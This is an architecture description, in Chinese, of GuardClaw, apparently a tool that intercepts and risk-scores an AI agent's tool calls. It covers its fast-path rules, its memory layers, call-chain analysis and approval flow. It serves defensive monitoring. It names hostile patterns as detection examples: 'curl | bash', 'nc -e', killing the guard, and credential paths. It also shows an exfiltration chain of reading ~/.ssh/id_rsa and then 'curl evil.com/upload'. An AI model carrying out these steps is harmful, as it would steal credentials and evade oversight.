# 架构说明

## 整体架构

GuardClaw 位于 AI Agent 和工具之间。每次工具调用在执行前都会经过 GuardClaw 的评估。

```
AI Agent  →  工具调用  →  GuardClaw  →  [放行 / 拦截 / 请求审批]  →  工具执行
```

## 四大核心子系统

### 1. 两阶段评判器

本地模型对每次工具调用评分，高风险调用（分数 ≥ 8）可升级到云端评判器进行更深入分析。

**LLM 之前的快速通道：**

1. **高风险模式匹配** — 正则匹配已知危险命令（`curl | bash`、`nc -e`、kill GuardClaw）→ 立即评分 9
2. **安全快速通道** — 安全命令白名单（git、npm、只读操作）→ 立即评分 1，不调用 LLM
3. **敏感路径检测** — `.ssh`、`.aws`、`.gnupg` 等 → 评分 7–8，不调用 LLM

只有通过三道快速通道的调用才会送往 LLM。

### 2. 多层安全记忆

四个层级捕获长程攻击模式：

| 层级 | 范围 | 保留时间 |
|------|------|---------|
| 原始事件 | 单次工具调用 | Session 内 |
| Session 摘要 | 单个 Session | Session 内 |
| 项目上下文 | 单个项目 | 持久化 |
| 全局知识 | 跨项目 | 持久化 |

这使 GuardClaw 能够检测跨数百次工具调用、跨 Session 展开的攻击。

### 3. 自适应记忆与链式分析

**链式分析** — 每个 Session 追踪最近 10 次工具调用。触发危险调用时，完整调用链会被注入 LLM 提示词，实现多步攻击检测：

```
read ~/.ssh/id_rsa  →  curl evil.com/upload   ← 标记为数据外泄链
```

**自适应记忆** — 每次审批/拒绝决策都会训练模式库。频繁被审批的模式自动获得更低分数，≥ 3 次审批且置信度 > 0.7 的模式直接跳过 LLM。

### 4. 主动干预

检测到高风险调用时：

1. **注入** — 在调用执行前向 Agent 上下文注入安全指导
2. **审批请求** — 双通道：Agent 对话框 + 控制台横幅 + 可选 Telegram/Discord/WhatsApp 推送
3. **熔断器** — 同一 Session 中反复拒绝会触发 Session 锁定
4. **输出扫描** — 检测工具输出中的凭证和 PII
5. **提示词注入防御** — 从爬取网页中提取的对抗性内容在到达 LLM 评判器前被中和

## 后端架构

```
server/
├── index.js            主 Express 服务器，SSE 推送，HTTP hook 端点
├── safeguard.js        LLM 风险评分引擎（快速通道 + 各后端）
├── approval-handler.js 决策引擎（白名单/黑名单/阈值）
├── event-store.js      SQLite 持久化（WAL 模式）
├── memory.js           自适应记忆（SQLite 驱动）
├── streaming-tracker.js 链式分析（每 Session 最近 10 次调用）
├── llm-engine.js       内置 MLX 引擎管理
└── routes/
    ├── config.js       配置 REST 端点（全部支持热重载）
    ├── benchmark.js    准确率基准测试
    └── models.js       模型下载/加载管理
```

## 数据存储

| 路径 | 内容 |
|------|------|
| `.guardclaw/events.db` | 所有工具调用事件（项目本地）|
| `.guardclaw/memory.db` | 审批/拒绝模式库（项目本地）|
| `.guardclaw/blocking-config.json` | 白名单/黑名单（项目本地）|
| `~/.guardclaw/identity/device.json` | ED25519 设备密钥（全局）|
| `~/.guardclaw/models/` | 下载的 MLX 模型（全局）|
| `~/.guardclaw/venv/` | mlx_lm Python 虚拟环境（全局）|
| `~/.guardclaw/.env` | 配置文件（全局）|
